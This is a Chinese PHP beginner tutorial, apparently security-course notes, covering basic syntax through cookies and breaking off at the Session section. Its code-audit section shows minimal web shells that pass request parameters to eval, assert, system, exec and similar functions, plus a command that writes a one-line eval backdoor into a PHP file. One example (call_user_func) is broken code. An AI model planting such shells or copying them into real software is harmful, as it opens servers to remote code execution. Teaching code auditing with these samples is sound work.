PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言

## PHP 是什么？

- PHP（全称：PHP：Hypertext Preprocessor，即"PHP：超文本预处理器"）是一种通用开源脚本语言。
- PHP 脚本在服务器上执行。
- PHP 可免费下载使用。

## PHP 文件是什么？

- PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码
- PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器
- PHP 文件的默认文件扩展名是 ".php"

## PHP 能做什么？

- PHP 可以生成动态页面内容
- PHP 可以创建、打开、读取、写入、关闭服务器上的文件
- PHP 可以收集表单数据
- PHP 可以发送和接收 cookies
- PHP 可以添加、删除、修改您的数据库中的数据
- PHP 可以限制用户访问您的网站上的一些页面
- PHP 可以加密数据



## 为什么使用 PHP？

- PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）
- PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）
- PHP 提供了广泛的数据库支持
- PHP 易于学习，并可高效地运行在服务器端



## PHP语法

PHP 脚本可以放在文档中的任何位置。

PHP 脚本以 **<?php** 开始，以 **?>** 结束：

PHP 文件的默认文件扩展名是 ".php"。

PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。

```html
<!DOCTYPE html>
<html>
<body>

<h1>My first PHP page</h1>

<?php
echo "Hello World!";
?>

</body>
</html>
```

PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。

通过 PHP，有两种在浏览器输出文本的基础指令：**echo** 和 **print**。

## PHP 注释

- //      单行注释
- /*  */   多行注释
- #-单行

```html
<!DOCTYPE html>
<html>
<body>

<?php
// 这是 PHP 单行注释

/*
这是
PHP 多行
注释
*/
?>

</body>
</html>
```



## 变量

变量是用于存储信息的"容器"

```php
<?php
$x=5;
$y=6;
$z=$x+$y;
echo $z;
?>
```



**PHP 变量规则**

- 变量以 $ 符号开始，后面跟着变量的名称
- 变量名必须以字母或者下划线字符开始
- 变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
- 变量名不能包含空格
- 变量名是区分大小写的（$y 和 $Y 是两个不同的变量）



## 创建PHP变量

PHP 没有声明变量的命令。

变量在您第一次赋值给它的时候被创建

```php
<?php
$txt="Hello world!";
$x=5;
$y=10.5;
?>
```

在上面的语句执行中，变量 **txt** 将保存值 **Hello world!**，且变量 **x** 将保存值 **5**。

**注释：**当您赋一个文本值给变量时，请在文本值两侧加上引号。



## PHP 是一门弱类型语言

PHP 会根据变量的值，自动把变量转换为正确的数据类型。

在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。



# echo 和 print 语句

echo 和 print 区别:

- echo - 可以输出一个或多个字符串
- print - 只允许输出一个字符串，返回值总为 1

**提示：**echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。

echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。

**显示字符串**

```php
<?php
header('Content-Type:text/html;charset=utf-8');
echo "<h2>PHP 很有趣!</h2>";
echo "Hello world!<br>";
echo "我要学 PHP!<br>";
echo "这是一个", "字符串，", "使用了", "多个", "参数。";
?>
```



**显示变量**

```php
<?php
$txt1="学习 PHP";
$txt2="xbxaq.com";
$cars=array("Volvo","BMW","Toyota");
 
echo $txt1;
echo "<br>";
echo "在 $txt2 学习 PHP ";
echo "<br>";
echo "我车的品牌是 {$cars[0]}";
?>
```



print 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。

**显示字符串**

```php
<?php
print "<h2>PHP 很有趣!</h2>";
print "Hello world!<br>";
print "我要学习 PHP!";
?>
```



**显示变量**

```php
<?php
$txt1="学习 PHP";
$txt2="zhiliaotang.COM";
$cars=array("Volvo","BMW","Toyota");
 
print $txt1;
print "<br>";
print "在 $txt2 学习 PHP ";
print "<br>";
print "我车的品牌是 {$cars[0]}";
?>
```



# 数据类型

PHP 变量存储不同的类型的数据，不同的数据类型可以做不一样的事情。

PHP 支持以下几种数据类型:

- String（字符串）
- Integer（整型）
- Float（浮点型）
- Boolean（布尔型）
- Array（数组）
- Object（对象）
- NULL（空值）
- Resource（资源类型）



## 字符串

一个字符串是一串字符的序列，就像 "Hello world!"。

你可以将任何文本放在单引号和双引号中

```php
<?php 
$x = "Hello world!";
echo $x;
echo "<br>"; 
$x = 'Hello world!';
echo $x;
?>
```



## 整型

整数是一个没有小数的数字。

整数规则:

- 整数必须至少有一个数字 (0-9)
- 整数不能包含逗号或空格
- 整数是没有小数点的
- 整数可以是正数或负数
- 整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。

PHP [var_dump() ](https://www.xbxaq.com/php/php-var_dump-function.html)函数返回变量的数据类型和值

```php
<?php 
$x = 5985;
var_dump($x);
echo "<br>"; 
$x = -345; // 负数 
var_dump($x);
echo "<br>"; 
$x = 0x8C; // 十六进制数
var_dump($x);
echo "<br>";
$x = 047; // 八进制数
var_dump($x);
?>
```



## 浮点型

浮点数是带小数部分的数字，或是指数形式

```php
<?php 
$x = 10.365;
var_dump($x);
echo "<br>"; 
$x = 2.4e3;
var_dump($x);
echo "<br>"; 
$x = 8E-5;
var_dump($x);
?>
```



## 布尔型

布尔型可以是 TRUE 或 FALSE

布尔型通常用于条件判断



## 数组

数组可以在一个变量中存储多个值

```php
<?php 
$cars=array("Volvo","BMW","Toyota");
var_dump($cars);
?>
```



## 对象

对象数据类型也可以用于存储数据。

在 PHP 中，对象必须声明。

首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。

然后我们在类中定义数据类型，然后在实例化的类中使用数据类型

```php
<?php
class Car
{
  var $color;
  function __construct($color="green") {
    $this->color = $color;
  }
  function what_color() {
    return $this->color;
  }
}
?>
```



##  NULL 值

NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。

NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。

可以通过设置变量值为 NULL 来清空变量数据

```php
<?php
$x="Hello world!";
$x=null;
var_dump($x);
?>
```



# 类型比较

虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。

- 松散比较：使用两个等号 **==** 比较，只比较值，不比较类型。
- 严格比较：用三个等号 **===** 比较，除了比较值，也比较类型。

例如，"42" 是一个字符串而 42 是一个整数。**FALSE** 是一个布尔值而 **"FALSE"** 是一个字符串。

```php
<?php
if(42 == "42") {
    echo '1、值相等';
}
 
echo PHP_EOL; // 换行符
 
if(42 === "42") {
    echo '2、类型相等';
} else {
    echo '3、类型不相等';
}
?>
```



## PHP中 比较 0、false、null（空指针）

```php
<?php
echo '0 == false: ';
var_dump(0 == false);
echo '0 === false: ';
var_dump(0 === false);
echo "<hr />";

echo '0 == null: ';
var_dump(0 == null);
echo '0 === null: ';
var_dump(0 === null);
echo "<hr />";

echo 'false == null: ';
var_dump(false == null);
echo 'false === null: ';
var_dump(false === null);
echo "<hr />";

echo '"0" == false: ';
var_dump("0" == false);
echo '"0" === false: ';
var_dump("0" === false);
echo "<hr />";

echo '"0" == null: ';
var_dump("0" == null);
echo '"0" === null: ';
var_dump("0" === null);
echo "<hr />";

echo '"" == false: ';
var_dump("" == false);
echo '"" === false: ';
var_dump("" === false);
echo "<hr />";

echo '"" == null: ';
var_dump("" == null);
echo '"" === null: ';
var_dump("" === null);
?>
```



# 常量

常量值被定义后，在脚本的其他任何地方都不能被改变

常量是一个简单值的标识符。该值在脚本中不能改变。

一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。

**注意：** 常量在整个脚本中都可以使用。

设置常量，使用 define() 函数，函数语法如下

```
bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
```

该函数有三个参数:

- **name：**必选参数，常量名称，即标志符。
- **value：**必选参数，常量的值。
- **case_insensitive** ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。

创建一个 **区分大小写的常量**, 常量值为 "欢迎访问 zhiliaotang.com"

```php
<?php
// 区分大小写的常量名
define("GREETING", "欢迎访问 zhiliaotang.com");
echo GREETING;    // 输出 
echo '<br>';
echo greeting;   // 输出 "greeting"，但是有警告信息，表示该常量未定义
?>
```



# 运算符

PHP 中，赋值运算符 **=** 用于给变量赋值。

在 PHP 中，算术运算符 **+** 用于把值加在一起。

## 算术运算符

```php
<?php 
$x=10; 
$y=6;
echo ($x + $y); // 输出16
echo '<br>';  // 换行
 
echo ($x - $y); // 输出4
echo '<br>';  // 换行
 
echo ($x * $y); // 输出60
echo '<br>';  // 换行
 
echo ($x / $y); // 输出1.6666666666667
echo '<br>';  // 换行
 
echo ($x % $y); // 输出4
echo '<br>';  // 换行
 
echo -$x;
?>
```



## 赋值运算符

```php
<?php 
$x=10; 
echo $x; // 输出10
echo "<hr />";
$y=20; 
$y += 100;
echo $y; // 输出120
echo "<hr />";
$z=50;
$z -= 25;
echo $z; // 输出25
echo "<hr />";
$i=5;
$i *= 6;
echo $i; // 输出30
echo "<hr />";
$j=10;
$j /= 5;
echo $j; // 输出2
echo "<hr />";
$k=15;
$k %= 4;
echo $k; // 输出3
?>
```



## 递增/递减运算符

```php
<?php
$x=10; 
echo ++$x; // 输出11
echo "<hr />";
$y=10; 
echo $y++; // 输出10
echo "<hr />";
$z=5;
echo --$z; // 输出4
echo "<hr />";
$i=5;
echo $i--; // 输出5
?>
```

- `i--`表示先使用`i`的值，然后再将`i`的值减1。例如，如果`i`的初始值为5，执行`i--`后，`i`的值变为4，但这个表达式的结果是5，因为在自减操作之前，`i`的值已经被读取。
- `--i表示先将`i`的值减1，然后再使用减1后的`i`值。继续上面的例子，如果`i`的初始值为5，执行`--i`后，`i`的值也变为4，但这个表达式的结果是4，因为在自减操作之后，`i`的值被读取。

## 比较运算符

```php
<?php
$x=100; 
$y="100";
 
var_dump($x == $y);
echo "<br>";
var_dump($x === $y);
echo "<br>";
var_dump($x != $y);
echo "<br>";
var_dump($x !== $y);
echo "<br>";
 
$a=50;
$b=90;
 
var_dump($a > $b);
echo "<br>";
var_dump($a < $b);
?>
```



## 三元运算符

### 语法格式

```
(expr1) ? (expr2) : (expr3) 
```

对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。



## 条件语句

您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。

在 PHP 中，提供了下列条件语句：

- **if 语句** - 在条件成立时执行代码
- **if...else 语句** - 在条件成立时执行一块代码，条件不成立时执行另一块代码
- **if...elseif....else 语句** - 在若干条件之一成立时执行一个代码块
- **switch 语句** - 在若干条件之一成立时执行一个代码块



if 语句用于**仅当指定条件成立时执行代码**

### 语法

```
if (条件)
{
    条件成立时要执行的代码;
}
```

```php
<?php
$t=date("H");
if ($t<"20")
{
    echo "Have a good day!";
}
?>
```



## if...else 语句

**在条件成立时执行一块代码，条件不成立时执行另一块代码**，请使用 if....else 语句。

### 语法

```
if (条件)
{
条件成立时执行的代码;
}
else
{
条件不成立时执行的代码;
}
```



```php
<?php
$t=date("H");
if ($t<"20")
{
    echo "Have a good day!";
}
else
{
    echo "Have a good night!";
}
?>
```



## if...elseif....else 语句

**在若干条件之一成立时执行一个代码块**，请使用 if....elseif...else 语句。.

### 语法

```
if (条件)
{
    if 条件成立时执行的代码;
}
elseif (条件)
{
    elseif 条件成立时执行的代码;
}
else
{
    条件不成立时执行的代码;
}
```



```php
<?php
$t=date("H");
if ($t<"10")
{
    echo "Have a good morning!";
}
elseif ($t<"20")
{
    echo "Have a good day!";
}
else
{
    echo "Have a good night!";
}
?>
```



#  Switch 语句

switch 语句用于根据多个不同条件执行不同动作。

如果您希望**有选择地执行若干代码块之一**，请使用 switch 语句。

```php
<?php
$favcolor="red";
switch ($favcolor)
{
case "red":
    echo "你喜欢的颜色是红色!";
    break;
case "blue":
    echo "你喜欢的颜色是蓝色!";
    break;
case "green":
    echo "你喜欢的颜色是绿色!";
    break;
default:
    echo "你喜欢的颜色不是 红, 蓝, 或绿色!";
}
?>
```



# 数组

数组能够在单个变量中存储多个值

数组可以在单个变量中存储多个值，并且您可以根据键访问其中的值。

```php
<?php
$cars=array("Volvo","BMW","Toyota");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>
```



## 创建数组

在 PHP 中，array() 函数用于创建数组：

```
array();
```



在 PHP 中，有三种类型的数组：

- **数值数组** - 带有数字 ID 键的数组
- **关联数组** - 带有指定的键的数组，每个键关联一个值
- **多维数组** - 包含一个或多个数组的数组



## 数值数组

这里有两种创建数值数组的方法：

自动分配 ID 键（ID 键总是从 0 开始）：

```
$cars=array("Volvo","BMW","Toyota");
```

```php
<?php
$cars=array("Volvo","BMW","Toyota");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>
```



## 获取数组的长度 - count() 函数

count() 函数用于返回数组的长度（元素的数量）

```php
<?php
$cars=array("Volvo","BMW","Toyota");
echo count($cars);
?>
```



## 遍历数值数组

遍历并打印数值数组中的所有值，您可以使用 for 循环

```php
<?php
$cars=array("Volvo","BMW","Toyota");
$arrlength=count($cars);
 
for($x=0;$x<$arrlength;$x++)
{
    echo $cars[$x];
    echo "<br>";
}
?>
```



## 关联数组

关联数组是使用您分配给数组的指定的键的数组。

这里有两种创建关联数组的方法

```
$age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");

or

$age['Peter']="35";
$age['Ben']="37";
$age['Joe']="43";
```



```php
<?php
$age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");
echo "Peter is " . $age['Peter'] . " years old.";
?>
```



## 遍历关联数组

遍历并打印关联数组中的所有值，您可以使用 foreach 循环

```php
<?php
$age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");
 
foreach($age as $x=>$x_value)
{
    echo "Key=" . $x . ", Value=" . $x_value;
    echo "<br>";
}
?>
```



# 循环

循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。

在 PHP 中，提供了下列循环语句：

- **while** - 只要指定的条件成立，则循环执行代码块
- **do...while** - 首先执行一次代码块，然后在指定的条件成立时重复这个循环
- **for** - 循环执行代码块指定的次数
- **foreach** - 根据数组中每个元素来循环代码块



## while 循环

while 循环将重复执行代码块，直到指定的条件不成立。

### 语法

```·
while (条件)
{
    要执行的代码;
}
```



实例首先设置变量 *i* 的值为 1 ($i=1;)。

然后，只要 *i* 小于或者等于 5，while 循环将继续运行。循环每运行一次，*i* 就会递增 1：

```html
<html>
<body>

<?php
$i=1;
while($i<=5)
{
    echo "The number is " . $i . "<br>";
    $i++;
}
?>

</body>
</html>
```



## do...while 语句

do...while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。

### 语法

```
do
{
    要执行的代码;
}
while (条件);
```



实例首先设置变量 *i* 的值为 1 ($i=1;)。

然后，开始 do...while 循环。循环将变量 *i* 的值递增 1，然后输出。先检查条件（*i* 小于或者等于 5），只要 *i* 小于或者等于 5，循环将继续运行

```php
<html>
<body>

<?php
$i=1;
do
{
    $i++;
    echo "The number is " . $i . "<br>";
}
while ($i<=5);
?>

</body>
</html>
```

 

# For 循环

for 循环用于您预先知道脚本需要运行的次数的情况。

### 语法

```
for (初始值; 条件; 增量)
{
    要执行的代码;
}
```

参数：

- **初始值**：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。
- **条件**：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。
- **增量**：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。

**注释：**上面的**初始值**和**增量**参数可为空，或者有多个表达式（用逗号分隔）。



### 实例

下面的实例定义一个初始值为 i=1 的循环。只要变量 **i** 小于或者等于 5，循环将继续运行。循环每运行一次，变量 **i** 就会递增 1

```php
<?php
for ($i=1; $i<=5; $i++)
{
    echo "数字为 " . $i;
}
?>
```



## foreach 循环

foreach 循环用于遍历数组。

### 语法

```
foreach ($array as $value)
{
    要执行代码;
}
```

每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。

```
foreach ($array as $key => $value)
{
    要执行代码;
}
```

每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。

```php
<?php
$x=array("Google","Runoob","Taobao");
foreach ($x as $value)
{
    echo $value;
    echo "<br>";
}
?>
```



```php
<?php
$x=array(1=>"Google", 2=>"Runoob", 3=>"Taobao");
foreach ($x as $key => $value)
{
    echo "key  为 " . $key . "，对应的 value 为 ". $value . PHP_EOL;
}
?>
```



# 函数

## 创建 PHP 函数

函数是通过调用函数来执行的。

```php
<?php
function functionName()
{
    // 要执行的代码
}
?>
```

函数准则：

- 函数的名称应该提示出它的功能
- 函数名称以字母或下划线开头（不能以数字开头）



```php
<?php
function writeName()
{
    echo "Kai Jim Refsnes";
}
 
echo "My name is ";
writeName();
?>
```



## 函数 - 添加参数

为了给函数添加更多的功能，我们可以添加参数，参数类似变量。

参数就在函数名称后面的一个括号内指定。

```php
<?php
function writeName($fname)
{
    echo $fname . " Refsnes.<br>";
}
 
echo "My name is ";
writeName("Kai Jim");
echo "My sister's name is ";
writeName("Hege");
echo "My brother's name is ";
writeName("Stale");
?>
```



```php
<?php
function writeName($fname,$punctuation)
{
    echo $fname . " Refsnes" . $punctuation . "<br>";
}
 
echo "My name is ";
writeName("Kai Jim",".");
echo "My sister's name is ";
writeName("Hege","!");
echo "My brother's name is ";
writeName("Ståle","?");
?>
```



## 函数 - 返回值

如需让函数返回一个值，请使用 return 语句

```php
<?php
function add($x,$y)
{
    $total=$x+$y;
    return $total;
}
 
echo "1 + 16 = " . add(1,16);
?>
```

###### 

# 表单



PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入

```html
<html>
<head>
<meta charset="utf-8">
<title>zhiliaotang.com</title>
</head>
<body>
 
<form action="welcome.php" method="post">
名字: <input type="text" name="fname">
年龄: <input type="text" name="age">
<input type="submit" value="提交">
</form>
 
</body>
</html>
```



用户填写完上面的表单并点击提交按钮时，表单的数据会被送往名为 "welcome.php" 的 PHP 文件

```php
欢迎<?php echo $_POST["fname"]; ?>!<br>
你的年龄是 <?php echo $_POST["age"]; ?>  岁。
```

## 文件上传表单

通过 PHP，可以把文件上传到服务器

test 项目下完成，目录结构为：

```
test
|-----upload             # 文件上传的目录
|-----form.html          # 表单文件
|-----upload_file.php    # php 上传代码
```

## 创建一个文件上传表单

upload_form.html

```html
<html>
<head>
<meta charset="utf-8">
<title>表单</title>
</head>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
  选择文件:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="上传文件" name="submit">
</form>

</body>
</html>
```

## 创建上传脚本

"upload.php" 文件含有供上传文件的代码

```php
<?php
header('Content-Type:text/html;charset=utf-8');
$target_dir = "./upload"; // 指定上传目录
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); // 目标文件路径
 
if ($_FILES["fileToUpload"]["size"] > 500000) {
  echo "抱歉, 你的文件太大。";
  exit;
}
 
$allowed_types = array("jpg", "png", "jpeg", "gif");
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
if (!in_array($imageFileType, $allowed_types)) {
  echo "抱歉, 只允许 JPG, JPEG, PNG & GIF 文件格式。";
  exit;
}
 
if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "文件上传成功。";
} else {
  echo "上传失败。";
}
?>
```



```
echo "错误：" . $_FILES["file"]["error"] . "<br>";
echo "上传文件名: " . $_FILES["file"]["name"] . "<br>";
echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"];
```

通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。

第一个参数是表单的 input name，第二个下标可以是 "name"、"type"、"size"、"tmp_name" 或 "error"。如下所示：

- $_FILES["file"]["name"] - 上传文件的名称
- $_FILES["file"]["type"] - 上传文件的类型
- $_FILES["file"]["size"] - 上传文件的大小，以字节计
- $_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称
- $_FILES["file"]["error"] - 由文件上传导致的错误代码

这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关允许哪些用户上传文件的限制。



# php超级全局变量

PHP超级全局变量（Superglobals）是PHP的预定义变量，这意味着它们无需定义就直接可以在PHP脚本中使用。PHP超级全局变量包含了如$_GET、$_POST、$_SERVER等，它们可以用于获取不同类型的输入和环境数据。

1. $_GET：通过 HTTP GET 方法传递给脚本的变量数组。
2. $_POST：通过 HTTP POST 方法传递给脚本的变量数组。
3. $_SERVER：通过web服务器传递给脚本的环境变量数组。
4. $_FILES：通过 HTTP POST 文件上传传递给脚本的变量数组。
5. $_COOKIE：通过 HTTP Cookies 传递给脚本的变量数组。
6. $_SESSION：当前脚本可用会话的变量数组。
7. $_REQUEST：经合并$_GET、$_POST和$_COOKIE后的变量数组。
8. $_ENV：通过环境方式传递给脚本的变量数组。
9. $GLOBALS：当前脚本所有的变量数组，该数组的键是变量 名，值是变量的内容。
10. $_SERVER['PHP_SELF']：获取当前执行脚本的文件名。
11. $_SERVER['GATEWAY_INTERFACE']：获取服务器使用的CGI规范的版本。
12. $_SERVER['SERVER_ADDR']：获取当前运行脚本所在的服务器的IP地址。
13. $_SERVER['SERVER_NAME']：获取当前运行脚本所在的服务器的主机名。
14. $_SERVER['REQUEST_TIME']：获取请求开始时的时间戳。
15. $_SERVER['QUERY_STRING']：获取查询（query）字符串（URL中?后面的部分）。

```php
// 获取URL参数*

echo $_GET['param'];


*// 获取POST参数*

echo $_POST['param'];
 

*// 获取COOKIE*

echo $_COOKIE['cookie_name'];
 

*// 获取SESSION*

echo $_SESSION['session_name'];

*// 获取服务器信息*

echo $_SERVER['SERVER_NAME'];


*// 获取上传的文件信息*

echo $_FILES['file']['name'];

*// 获取环境变量*

echo $_ENV['HOME'];


*// 获取全局变量*

$GLOBALS['global_var'] = 'Hello, Global';

echo $GLOBALS['global_var'];
```

# 危险函数(代码审计)

| 代码执行函数   | 命令执行函数 |
| -------------- | ------------ |
| eval           | system       |
| assert         | exec         |
| preg_replace   | shell_exec   |
| call_user_func | passthru     |
| array_map      | popen        |

## 代码执行函数

### **1.eval()**            

​    会将符合PHP语句规范[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)当作代码执行

```php
<?php
    $code = $_REQUEST['code'];
	eval($code);
    ?>
```

![image-20240520102138796](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520102138796.png)

### **2.**assert ()             

​    会将字符串当做PHP代码来执行

```php
<?php
    $a = $_REQUEST['ljc'];
	assert($a);
    ?>
```

![image-20240520102955794](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520102955794.png)

### 3.preg_replace()

函数的作用是对字符串进行正则匹配后替换

参数说明：

- `pattern`：必需。正则表达式的模式，用于匹配和替换文本。
- `replacement`：必需。替换模式，用于替换匹配到的文本。
- `subject`：必需。要被替换的文本或数组。

```php
$text = "Hello, world!";
$newText = preg_replace('/world/', 'PHP', $text);
echo $newText; // 输出 "Hello, PHP!"
```

### 4.**call_user_func（）**            

​    用于调用用户指定的可调用函数

```php
<?php
    function add($a,$b){
    return $a,$b;
}
$result = call_user_func('add',"liwei","cheng")
    echo $result;
    ?>
```

![image-20240520105912710](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520105912710.png)

### 5.**array_map（）**

**例如，有一个数组arr1=array(1,2,3,4,5); arr1=array(1,2,3,4,5);我们想要将每个数加上3并储存到另一个数组arr2中，可以使用array_map:**

```php
<?php
    function add($a){
    return $a+3;
}
$arr1 =array(1,2,3,4);
$arr2 =array_map('add',$arr1);
print_r($arr2);
    ?>
```

![image-20240520110616658](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520110616658.png)

## 命令执行函数

### 1.system()         

**能够将字符串作为操作系统（Operator Sytstemc，OS）命令执行。在类似systemc() 函数调用系统命令时，PHP 会自动区分平台**

```php
<?php
    $cmd=$_REQUEST ["cmd"];
	system($cmd);
    ?>
```

![image-20240520111017257](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520111017257.png)

还可以用echo写入一句话木马，来进行连接

```
cmd=echo “<?php @eval($\_POST['dys']);?>” >> dys.php
```



```php
<?php
    $cmd=$_GET ["cmd"];
	system($cmd);
    ?>
        
posT无结果
<?php
    $cmd=$_POST ["cmd"];
	system($cmd);
    ?>
```

### **2.exec（）**

**需要命令执行结果****只输出命令执行结果的最后一行，约等于没有回显**

```php
<?php
    $cmd=$_REQUEST ["cmd"];
	echo exec($cmd);
    ?>
```

![image-20240520111828402](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520111828402.png)

### **3.shell_exec（）**

**需要输出命令执行结果**

```php
<?php
    $cmd=$_REQUEST ["cmd"];
	echo shell_exec($cmd);
    ?>
```

![image-20240520111949319](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520111949319.png)

### **4.passthru（）**

**自带输出功能**

```php
<?php
    $cmd=$_REQUEST ["cmd"];
	passthru($cmd);
    ?>
```

![image-20240520112140609](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520112140609.png)

### **5.popen（）**

**函数返回值为文件指针，可以简单理解为文件名**

```
<?php
    $cmd=$_REQUEST ["cmd"];
    
    $result = popen($cmd,'r');
    
	echo fread($result,1024);
    ?>
```

![image-20240520112532108](G:\BaiduSyncdisk\知了堂\01web安全\06WEB安全讲义\01PHP\PHP基础\images\image-20240520112532108.png)

# 文件打开和读取

PHP中的[文件操作](https://so.csdn.net/so/search?q=文件操作&spm=1001.2101.3001.7020)主要包括读取文件和写入文件。我们可以把文件想象成一个存储数据的容器，就像我们平时用的文件夹一样。在PHP中，我们可以使用特定的函数来打开、读取和写入文件。

## 读取文件

读取文件就像是打开一个文件夹，然后查看里面的内容一样。在PHP中，我们可以使用`fopen()`函数来打开一个文件，然后使用`fread()`函数来读取文件的内容,使用`fclose()`函数来关闭文件,使用`filesize()`函数来获取文件的大小。

```php
<?php  
// 打开文件  
$file = fopen("1.txt", "r"); // "r" 表示只读模式  

// 检查文件是否成功打开  
if ($file) {  
    // 读取文件内容  
    $content = fread($file, filesize("1.txt"));

    // 输出文件内容  
    echo $content;
      
    // 关闭文件  
    fclose($file);

} else {  
    echo "无法打开文件！";
}  
?>
```

## 写入文件

写入文件就像是往一个文件夹里添加新的内容一样。在PHP中，我们可以使用`fopen()`函数以写入模式打开文件，然后使用`fwrite()`函数来写入内容。

```php
<?php  
header('Content-Type:text/html;charset=utf-8');
// 打开文件以写入内容  
$file = fopen("1.txt", "w"); // "w" 表示写入模式，如果文件不存在则创建，存在则清空内容  

// 检查文件是否成功打开  
if ($file) {  
    // 写入内容  
    $text = "这是一些新的内容！";  
    fwrite($file, $text);  
      

    // 关闭文件  
    fclose($file);  
      
    echo "内容已成功写入文件！";  

} else {  
    echo "无法打开文件！";  
}  
```

如果你想在文件的末尾添加内容，而不是覆盖原有内容，你应该使用`"a"`模式（追加模式）来打开文件：

```php
$file = fopen("example.txt", "a"); // "a" 表示追加模式，如果文件不存在则创建
```

# Cookie

## 1.Cookie是什么？

Cookie是一种在客户端保存数据的方式。客户端可以是浏览器、移动端等等。Cookie通过在HTTP响应头中设置Set-Cookie字段来将数据存储到客户端，浏览器会自动将这些数据保存在本地，在下一次请求服务器时，会将这些数据发送到服务器端，服务器端根据这些数据进行相应逻辑处理。Cookie所存储的数据有大小限制，通常不超过4KB。

## 2.Cookie的作用

Cookie可以用于一些场景：比如记录用户的登录状态、用户的浏览历史、用户的购物车信息等等。

## 3.Cookie的特点

可靠性：Cookie数据是存储在客户端浏览器中的，用户可以随意清除，所以Cookie数据不是很可靠。

安全性：由于Cookie数据是存储在客户端，所以其他人在客户端中可以轻易地看到这个Cookie，因此Cookie的安全性较差。

## PHP中操作Cookie

### 1.设置Cookie

在PHP中设置Cookie可以使用setcookie()函数进行操作，使用方法如下：

```php
setcookie(name, value, expire, path, domain, secure, httponly);
```

参数解释：

- name：Cookie名称。
- value：Cookie值。
- expire：Cookie过期时间，以秒为单位。默认为0，表示关闭浏览器失效。
- path：可选参数，指定Cookie在哪个路径下有效。默认为'/'，表示所有路径下的页面都可以访问到这个Cookie。
- domain：可选参数，指定Cookie在哪个域名下有效。默认为空字符串，表示在当前域名下有效。
- secure：可选参数，指定Cookie是否只能通过HTTPS传输。默认为false。
- httponly：可选参数，指定Cookie是否只能通过HTTP传输。默认为false。

代码：

```php
setcookie('name', 'tom');
setcookie('age', '20', time()+3600); //设置过期时间为1小时
```

### 2.获取Cookie

在PHP中获取Cookie可以使用$_COOKIE超全局变量获取，使用方法如下：

```php
$value= $_COOKIE['name'];
```

### 3.删除Cookie

在PHP中删除Cookie，使用setcookie()函数将过期时间设置成一个过去的时间即可：

```php
setcookie('name', '', time()-3600); //将过期时间设置成一个过去的时间，即可删除Cookie
```

# Session

## 1.Session是什么？

Session是一种在服务器端保存数据的方式。服务器端可以通过生成Session ID，在PHP中，Session ID默认是通过cookie方式存储在客户端的，也可以通过URL重写等方式实现。Session在存储数据方面没有Cookie的大小限制，但需要考虑服务器的性能问题。

## 2.Session的作用

